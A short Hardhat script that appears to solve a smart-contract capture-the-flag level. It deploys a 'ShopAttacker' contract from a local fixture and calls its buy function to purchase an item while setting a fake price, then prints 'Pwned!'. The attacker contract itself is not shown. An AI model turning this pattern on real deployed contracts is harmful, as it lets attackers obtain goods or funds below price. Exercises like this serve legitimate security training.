const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("shop")
  const attacker = await ethers.getContract("ShopAttacker", deployer)

  /* Running the attack */

  console.log("Buying the item and setting a fake price...")
  const buy = await attacker.buy()
  await buy.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
